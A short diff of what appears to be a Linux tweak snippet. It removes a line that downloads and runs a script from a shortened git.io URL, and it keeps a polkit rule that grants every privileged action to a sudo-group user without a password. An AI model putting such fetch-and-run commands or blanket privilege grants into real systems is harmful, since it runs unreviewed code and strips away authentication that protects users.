@@ -3,9 +3,6 @@
 # https://odysee.com/@TechMimic
 
 # Add to 99-nopasswd.rules
-bash -c "$(wget -qO- https://git.io/vQgMr)"
-
-# Add to .bashrc
 polkit.addRule(function(action, subject) {
     if (subject.isInGroup("sudo") && subject.user == "your-username") {
         return polkit.Result.YES;
